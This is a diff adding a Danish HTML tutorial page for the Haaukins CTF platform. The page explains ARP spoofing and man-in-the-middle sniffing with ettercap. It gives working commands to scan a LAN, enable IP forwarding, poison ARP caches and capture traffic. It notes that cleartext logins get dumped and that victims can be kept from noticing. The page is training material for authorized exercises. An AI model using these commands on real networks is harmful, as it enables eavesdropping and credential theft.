@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins primer: ARP-spoofing &amp; MITM (sniffing)</title>
+<meta name="description" content="Baggrund til Haaukins sniffing-opgaver: hvorfor man ikke bare kan aflytte et switched netværk, og hvordan ARP-spoofing gør dig til man-in-the-middle med ettercap.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Primer: ARP-spoofing &amp; man-in-the-middle</h1>
+<p class="subtitle">Hvorfor du ikke bare kan sniffe — og hvordan du bliver mellemmand.</p>
+<div class="badges"><span class="badge cat">Teknik-primer</span><span class="badge">Haaukins CTF</span></div>
+
+
+<h2>Problemet: switches skjuler andres trafik</h2>
+<p>På et switched netværk sender switchen kun pakker til den rette modtager — så din maskine ser som udgangspunkt <strong>kun sin egen</strong> trafik. For at aflytte to andre maskiner skal du narre dem til at sende deres trafik gennem <em>dig</em>.</p>
+<h2>Løsningen: ARP-spoofing</h2>
+<p>ARP oversætter IP → MAC-adresse, og maskiner stoler blindt på svaret. Du svarer falsk: fortæl offer A at "B's IP sidder på MIN MAC", og B det omvendte. Nu løber begges trafik gennem dig; du videresender den (IP-forwarding), og de opdager intet. Det kaldes en <strong>man-in-the-middle (MITM)</strong>.</p>
+<h2>Opskriften (ettercap)</h2>
+<pre><code>ip -br a                                   # din IP + interface (fx eth0)
+sudo arp-scan -I eth0 --localnet          # find levende hosts
+sudo sysctl -w net.ipv4.ip_forward=1      # tillad videresending (ellers taber ofrene nettet)
+sudo ettercap -T -q -i eth0 -M arp:remote /&lt;mål-ip&gt;// ///</code></pre><p><code>-M arp:remote</code> = ARP-spoof-MITM. Target-format er <code>MAC/IPv4/IPv6/PORT</code>, så <code>/IP//</code> = netop den host og <code>///</code> = alle andre. Tilføj <code>-w fil.pcap</code> for at gemme trafikken til senere analyse i <code>tshark</code>/Wireshark.</p>
+
+<h2>Hvad du har lært</h2>
+<ul><li>Switched netværk skjuler andres trafik; <strong>ARP-spoofing</strong> omgår det.</li><li>Husk <code>net.ipv4.ip_forward=1</code>, ellers taber ofrene forbindelsen (og du afslører dig selv).</li><li><code>ettercap -T</code> dumper selv klartekst-logins (HTTP/FTP/telnet); <code>-w</code> gemmer en pcap.</li><li>Stop altid ettercap pænt med <code>q</code>, så den gen-ARP'er ofrene korrekt.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
